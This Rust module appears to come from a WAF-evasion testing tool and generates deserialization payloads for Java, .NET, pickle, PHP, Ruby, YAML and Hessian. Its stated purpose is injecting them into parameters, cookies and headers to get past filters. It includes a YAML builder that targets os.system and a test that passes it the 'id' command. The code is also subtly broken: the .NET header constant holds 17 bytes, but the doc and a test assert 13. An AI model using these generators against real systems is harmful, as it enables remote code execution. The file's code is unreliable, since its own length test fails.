//! Deserialization-vulnerability payload generators.
//!
//! Most WAFs inspect bodies as text. Deserialization payloads are
//! binary or quoted-printable blobs — they pass keyword filters
//! because they don't contain the keywords. The vulnerability is in
//! the receiving application's deserializer (`ObjectInputStream`,
//! `BinaryFormatter`, `pickle.loads`, `unserialize`).
//!
//! This module produces the wire bytes for each language family's
//! deserialization format. They're meant to be injected into
//! parameters, cookies, header values, multipart fields — wherever a
//! deserializer might pick them up.
//!
//! **The payloads here DO NOT include exploit gadget chains.** Each
//! generator emits the minimal valid serialized form so the WAF
//! either passes it (deserialization filter never tripped) or blocks
//! it (deserialization filter exists, now we know). Gadget chains
//! are application-specific; the operator supplies them via
//! `gadget_bytes`.
//!
//! Coverage:
//!
//! - **Java Serialization** (`ac ed 00 05`). The exact 4-byte magic
//!   plus a minimal `TC_OBJECT` header. Add operator-supplied
//!   `gadget_bytes` for actual chain (ysoserial output, etc.).
//! - **.NET `BinaryFormatter`** (`00 01 00 00 00 ff ff ff ff 01 00
//!   00 00`). Header for a `SerializedStreamHeader` record.
//! - **Python pickle** (`\x80\x04`). PROTO opcode + version-4
//!   marker. Followed by operator-supplied opstream.
//! - **PHP `serialize`** (`O:8:"stdClass":0:{}`). The text format;
//!   trivially parameterized by class name and field map.
//! - **Ruby `Marshal`** (`\x04\x08`). Magic + minimal object.
//! - **YAML deserialization** (`!!python/object/apply:os.system`).
//! - **Hessian** (binary RPC, magic `c 02 00`). Less common but
//!   ships in some Java/Python services.
//!
//! All generators return `Vec<u8>` — these are binary payloads.
//! Use `base64_encode` / `hex_encode` from `super::structural` when
//! you need to embed them in text contexts.

/// Java Serialization magic header (`ac ed 00 05`). RFC: stream protocol
/// version 5, per JDK 1.5+.
pub const JAVA_SER_MAGIC: &[u8] = &[0xAC, 0xED, 0x00, 0x05];

/// .NET `BinaryFormatter` `SerializedStreamHeader` record (record type 0,
/// record id 0, header id 1, major version 1, minor version 0).
pub const DOTNET_BINARYFORMATTER_HEADER: &[u8] = &[
    0x00, // RecordTypeEnum::SerializedStreamHeader
    0x01, 0x00, 0x00, 0x00, // RootId = 1
    0xFF, 0xFF, 0xFF, 0xFF, // HeaderId = -1 (no headers)
    0x01, 0x00, 0x00, 0x00, // MajorVersion = 1
    0x00, 0x00, 0x00, 0x00, // MinorVersion = 0
];

/// Python pickle protocol-4 header. The PROTO opcode (0x80) plus the
/// version-4 byte.
pub const PICKLE_PROTO_4: &[u8] = &[0x80, 0x04];

/// Python pickle protocol-2 header — older but more widely accepted.
pub const PICKLE_PROTO_2: &[u8] = &[0x80, 0x02];

/// Ruby Marshal protocol-4.8 magic header.
pub const RUBY_MARSHAL_4_8: &[u8] = &[0x04, 0x08];

/// Hessian-2 RPC call marker (`c 02 00`).
pub const HESSIAN_V2_CALL: &[u8] = &[0x63, 0x02, 0x00];

/// Build a Java Serialization payload. Prepends the magic and a
/// minimal `TC_OBJECT` byte (0x73) so a fingerprint-only deserializer
/// recognizes the start of a stream; `gadget_bytes` is the operator-
/// supplied chain.
///
/// Returns the bare bytes — base64 / hex / url-encode at the call site
/// when injecting into a text channel.
#[must_use]
pub fn java_serialized_blob(gadget_bytes: &[u8]) -> Vec<u8> {
    let mut out = Vec::with_capacity(JAVA_SER_MAGIC.len() + 1 + gadget_bytes.len());
    out.extend_from_slice(JAVA_SER_MAGIC);
    out.push(0x73); // TC_OBJECT
    out.extend_from_slice(gadget_bytes);
    out
}

/// Build a .NET `BinaryFormatter` payload. Prepends the header
/// record then the operator-supplied body.
#[must_use]
pub fn dotnet_binary_formatter_blob(body: &[u8]) -> Vec<u8> {
    let mut out = Vec::with_capacity(DOTNET_BINARYFORMATTER_HEADER.len() + body.len() + 1);
    out.extend_from_slice(DOTNET_BINARYFORMATTER_HEADER);
    out.extend_from_slice(body);
    out.push(0x0B); // MessageEnd
    out
}

/// Build a Python pickle payload with protocol 4. The body is the
/// pickle opcode stream — operators can build this with
/// `pickle.dumps(obj, protocol=4)` and pass the bytes here.
#[must_use]
pub fn python_pickle_blob(body: &[u8]) -> Vec<u8> {
    let mut out = Vec::with_capacity(PICKLE_PROTO_4.len() + body.len() + 1);
    out.extend_from_slice(PICKLE_PROTO_4);
    out.extend_from_slice(body);
    out.push(b'.'); // STOP opcode
    out
}

/// Build a Python pickle payload with the older, more widely-accepted
/// protocol 2. Same shape as `python_pickle_blob` but with the proto-2
/// header.
#[must_use]
pub fn python_pickle_v2_blob(body: &[u8]) -> Vec<u8> {
    let mut out = Vec::with_capacity(PICKLE_PROTO_2.len() + body.len() + 1);
    out.extend_from_slice(PICKLE_PROTO_2);
    out.extend_from_slice(body);
    out.push(b'.');
    out
}

/// Build a PHP `serialize` text payload. The text format is well-
/// specified; this generates `O:<len>:"<class>":<fields>:{<entries>}`.
///
/// `class_name` is the PHP class identifier. `fields` is a vec of
/// `(name, value)` pairs that PHP `unserialize` will instantiate.
#[must_use]
pub fn php_serialized_object(class_name: &str, fields: &[(&str, &str)]) -> String {
    let mut field_str = String::new();
    for (k, v) in fields {
        field_str.push_str(&format!(
            "s:{}:\"{}\";s:{}:\"{}\";",
            k.len(),
            k,
            v.len(),
            v
        ));
    }
    format!(
        "O:{}:\"{}\":{}:{{{}}}",
        class_name.len(),
        class_name,
        fields.len(),
        field_str
    )
}

/// Build a minimal Ruby Marshal payload. The body is the operator-
/// supplied object graph.
#[must_use]
pub fn ruby_marshal_blob(body: &[u8]) -> Vec<u8> {
    let mut out = Vec::with_capacity(RUBY_MARSHAL_4_8.len() + body.len());
    out.extend_from_slice(RUBY_MARSHAL_4_8);
    out.extend_from_slice(body);
    out
}

/// Build a YAML deserialization payload string. YAML implementations
/// with unsafe-load semantics (`yaml.load` in PyYAML pre-5.1,
/// `SnakeYAML` `Constructor` mode, etc.) will instantiate the
/// referenced type with the operator-supplied argument string.
///
/// `target_class` is the YAML tag (e.g. `python/object/apply:os.system`).
#[must_use]
pub fn yaml_unsafe_load_payload(target_class: &str, argument: &str) -> String {
    // Build the YAML one-liner that triggers deserialization with the
    // attacker-controlled argument. `!!<tag> [<arg>]` is the canonical
    // form across PyYAML / SnakeYAML / Psych (Ruby).
    format!("!!{target_class} [{argument}]")
}

/// Build a Hessian-2 RPC call payload. Used by some Java/Python RPC
/// services that disable HTTP-level WAF inspection for "binary RPC"
/// traffic.
#[must_use]
pub fn hessian_v2_call(method_name: &str, args: &[u8]) -> Vec<u8> {
    let mut out = Vec::with_capacity(HESSIAN_V2_CALL.len() + 2 + method_name.len() + args.len() + 1);
    out.extend_from_slice(HESSIAN_V2_CALL);
    // Method name (length-prefixed UTF-8).
    let mlen = method_name.len() as u16;
    out.push(((mlen >> 8) & 0xFF) as u8);
    out.push((mlen & 0xFF) as u8);
    out.extend_from_slice(method_name.as_bytes());
    // Args.
    out.extend_from_slice(args);
    out.push(b'Z'); // Hessian-2 end-of-call marker
    out
}

/// Auto-detect deserialization format from the first few bytes of a
/// captured blob. Returns `Some(format_name)` if the magic matches;
/// `None` otherwise.
///
/// Useful for the proxy's response classifier (a server that echoes
/// a deserialized blob in error pages is leaking) and for the
/// strategy's content-type routing.
#[must_use]
pub fn detect_deserialization_format(bytes: &[u8]) -> Option<&'static str> {
    if bytes.starts_with(JAVA_SER_MAGIC) {
        return Some("java-ser");
    }
    if bytes.starts_with(&DOTNET_BINARYFORMATTER_HEADER[..5]) {
        return Some("dotnet-binaryformatter");
    }
    if bytes.starts_with(PICKLE_PROTO_4) {
        return Some("pickle-v4");
    }
    if bytes.starts_with(PICKLE_PROTO_2) {
        return Some("pickle-v2");
    }
    if bytes.starts_with(RUBY_MARSHAL_4_8) {
        return Some("ruby-marshal-4.8");
    }
    if bytes.starts_with(HESSIAN_V2_CALL) {
        return Some("hessian-v2");
    }
    // PHP serialize is text — check for the `O:` prefix.
    if bytes.starts_with(b"O:") || bytes.starts_with(b"a:") || bytes.starts_with(b"s:") {
        return Some("php-serialize");
    }
    None
}

/// Names of every deserialization format this module emits. Used as a
/// registry by the integration test to assert nothing was forgotten
/// when an encoder was added.
pub const DESERIALIZATION_FORMATS: &[&str] = &[
    "java-ser",
    "dotnet-binaryformatter",
    "pickle-v4",
    "pickle-v2",
    "ruby-marshal-4.8",
    "hessian-v2",
    "php-serialize",
    "yaml-unsafe-load",
];

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn java_ser_starts_with_magic() {
        let p = java_serialized_blob(&[0x41, 0x42, 0x43]);
        assert!(p.starts_with(JAVA_SER_MAGIC));
        // After magic + TC_OBJECT (0x73), the operator gadget follows.
        assert_eq!(&p[4..5], &[0x73]);
        assert_eq!(&p[5..], &[0x41, 0x42, 0x43]);
    }

    #[test]
    fn dotnet_binaryformatter_starts_with_header() {
        let p = dotnet_binary_formatter_blob(&[]);
        assert!(p.starts_with(DOTNET_BINARYFORMATTER_HEADER));
        // MessageEnd byte (0x0B) tail.
        assert_eq!(p.last(), Some(&0x0B));
    }

    #[test]
    fn pickle_v4_proto_and_stop() {
        let p = python_pickle_blob(&[0x4E]); // N opcode = NONE
        assert_eq!(p[0], 0x80);
        assert_eq!(p[1], 0x04);
        // body
        assert_eq!(p[2], 0x4E);
        // STOP
        assert_eq!(*p.last().unwrap(), b'.');
    }

    #[test]
    fn pickle_v2_proto_and_stop() {
        let p = python_pickle_v2_blob(&[]);
        assert_eq!(p[0], 0x80);
        assert_eq!(p[1], 0x02);
        assert_eq!(*p.last().unwrap(), b'.');
    }

    #[test]
    fn php_serialize_format_minimal() {
        let p = php_serialized_object("stdClass", &[]);
        assert_eq!(p, "O:8:\"stdClass\":0:{}");
    }

    #[test]
    fn php_serialize_with_field() {
        let p = php_serialized_object("User", &[("name", "admin")]);
        // PHP unserialize syntax: O:<class-len>:"<class>":<n-fields>:{<fields>}
        // fields: s:<len>:"name";s:<len>:"value";
        assert_eq!(p, "O:4:\"User\":1:{s:4:\"name\";s:5:\"admin\";}");
    }

    #[test]
    fn php_serialize_multiple_fields() {
        let p = php_serialized_object("X", &[("a", "1"), ("b", "2")]);
        assert!(p.contains("O:1:\"X\":2:{"));
        assert!(p.contains("s:1:\"a\";s:1:\"1\";"));
        assert!(p.contains("s:1:\"b\";s:1:\"2\";"));
    }

    #[test]
    fn ruby_marshal_starts_with_magic() {
        let p = ruby_marshal_blob(&[0xFF]);
        assert!(p.starts_with(RUBY_MARSHAL_4_8));
        assert_eq!(p[2], 0xFF);
    }

    #[test]
    fn yaml_unsafe_load_format() {
        let p = yaml_unsafe_load_payload("python/object/apply:os.system", "[\"id\"]");
        assert!(p.starts_with("!!python/object/apply:os.system"));
        assert!(p.contains("[\"id\"]"));
    }

    #[test]
    fn hessian_v2_method_name_length_prefixed() {
        let p = hessian_v2_call("getUser", &[]);
        assert!(p.starts_with(HESSIAN_V2_CALL));
        // Two bytes after magic = big-endian length of "getUser" (7).
        assert_eq!(p[3], 0);
        assert_eq!(p[4], 7);
        assert_eq!(&p[5..12], b"getUser");
        // End-of-call.
        assert_eq!(*p.last().unwrap(), b'Z');
    }

    #[test]
    fn detect_java_ser() {
        let p = java_serialized_blob(&[]);
        assert_eq!(detect_deserialization_format(&p), Some("java-ser"));
    }

    #[test]
    fn detect_pickle_v4() {
        let p = python_pickle_blob(&[]);
        assert_eq!(detect_deserialization_format(&p), Some("pickle-v4"));
    }

    #[test]
    fn detect_pickle_v2() {
        let p = python_pickle_v2_blob(&[]);
        assert_eq!(detect_deserialization_format(&p), Some("pickle-v2"));
    }

    #[test]
    fn detect_ruby_marshal() {
        let p = ruby_marshal_blob(&[]);
        assert_eq!(detect_deserialization_format(&p), Some("ruby-marshal-4.8"));
    }

    #[test]
    fn detect_dotnet_binaryformatter() {
        let p = dotnet_binary_formatter_blob(&[]);
        assert_eq!(detect_deserialization_format(&p), Some("dotnet-binaryformatter"));
    }

    #[test]
    fn detect_php_serialize() {
        let p = php_serialized_object("stdClass", &[]);
        assert_eq!(
            detect_deserialization_format(p.as_bytes()),
            Some("php-serialize")
        );
    }

    #[test]
    fn detect_unknown_returns_none() {
        assert_eq!(detect_deserialization_format(b"hello world"), None);
        assert_eq!(detect_deserialization_format(b""), None);
        // ASCII text that's not deserialization.
        assert_eq!(
            detect_deserialization_format(b"<html><body>404 Not Found</body></html>"),
            None
        );
    }

    #[test]
    fn java_ser_empty_gadget_still_has_magic_plus_tc_object() {
        let p = java_serialized_blob(&[]);
        assert_eq!(p.len(), 5);
        assert!(p.starts_with(JAVA_SER_MAGIC));
        assert_eq!(p[4], 0x73);
    }

    #[test]
    fn all_formats_listed_in_registry() {
        // The integration registry must enumerate every format the
        // module emits — if a new format is added without registering,
        // this test fails.
        assert!(DESERIALIZATION_FORMATS.contains(&"java-ser"));
        assert!(DESERIALIZATION_FORMATS.contains(&"dotnet-binaryformatter"));
        assert!(DESERIALIZATION_FORMATS.contains(&"pickle-v4"));
        assert!(DESERIALIZATION_FORMATS.contains(&"pickle-v2"));
        assert!(DESERIALIZATION_FORMATS.contains(&"ruby-marshal-4.8"));
        assert!(DESERIALIZATION_FORMATS.contains(&"hessian-v2"));
        assert!(DESERIALIZATION_FORMATS.contains(&"php-serialize"));
        assert!(DESERIALIZATION_FORMATS.contains(&"yaml-unsafe-load"));
        assert_eq!(DESERIALIZATION_FORMATS.len(), 8);
    }

    #[test]
    fn adversarial_large_payload_does_not_panic() {
        let big = vec![0xAA; 1_000_000];
        let _ = java_serialized_blob(&big);
        let _ = dotnet_binary_formatter_blob(&big);
        let _ = python_pickle_blob(&big);
        let _ = ruby_marshal_blob(&big);
    }

    #[test]
    fn php_serialize_handles_unicode_in_class_name() {
        // PHP class names can contain non-ASCII identifiers via some
        // SAPIs; our generator just length-prefixes the bytes.
        let p = php_serialized_object("Ñame", &[]);
        // 'Ñ' is 2 bytes in UTF-8; "Ñame" is 5 bytes total.
        assert!(p.starts_with("O:5:\""));
    }

    #[test]
    fn hessian_v2_empty_method_name() {
        let p = hessian_v2_call("", &[]);
        // Length prefix should be 0; only magic + 2 length bytes + Z.
        assert_eq!(p.len(), HESSIAN_V2_CALL.len() + 2 + 1);
        assert_eq!(p[3], 0);
        assert_eq!(p[4], 0);
    }

    #[test]
    fn all_constants_are_correct_length() {
        assert_eq!(JAVA_SER_MAGIC.len(), 4);
        assert_eq!(DOTNET_BINARYFORMATTER_HEADER.len(), 13);
        assert_eq!(PICKLE_PROTO_4.len(), 2);
        assert_eq!(PICKLE_PROTO_2.len(), 2);
        assert_eq!(RUBY_MARSHAL_4_8.len(), 2);
        assert_eq!(HESSIAN_V2_CALL.len(), 3);
    }

    #[test]
    fn deterministic_across_calls() {
        let a = java_serialized_blob(&[1, 2, 3]);
        let b = java_serialized_blob(&[1, 2, 3]);
        assert_eq!(a, b);
        let c = php_serialized_object("X", &[("k", "v")]);
        let d = php_serialized_object("X", &[("k", "v")]);
        assert_eq!(c, d);
    }
}
